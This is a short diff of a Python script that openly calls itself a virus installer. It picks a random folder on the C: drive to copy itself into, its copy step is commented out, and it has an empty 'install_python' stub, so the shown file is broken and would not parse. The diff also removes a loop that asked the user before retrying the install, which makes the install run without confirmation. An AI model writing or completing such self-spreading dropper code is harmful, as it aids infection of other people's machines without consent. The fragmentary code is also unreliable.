@@ -1,6 +1,7 @@
 import numpy as np
 import os
 import shutil as st
+    
 
 def get_random_folder_path(path="C:\\"):
     dirs = os.listdir(path)
@@ -11,6 +12,9 @@ def get_random_folder_path(path="C:\\"):
         try: return get_random_folder_path(f"{path}\\{dirs[inx]}")
         except: dirs.pop(inx)
     return path
+
+def install_python():
+
 
 def install_virus():
     print(f"start install virus")
@@ -25,12 +29,4 @@ def install_virus():
     #st.copytree(SRC_CODE_PATH,DEST_PATH + "\\vir")
     
 if (__name__ == "__main__"):
-    for i in range(10):
-        try:
-            install_virus()
-        except Exception as e:
-            print(f"fail to install virus at try {i} with error {e}")
-            anser = input("do you want to try again: ")
-            if (anser != "yes"):
-                print("exit without installtion")
-                exit()
+    install_virus()
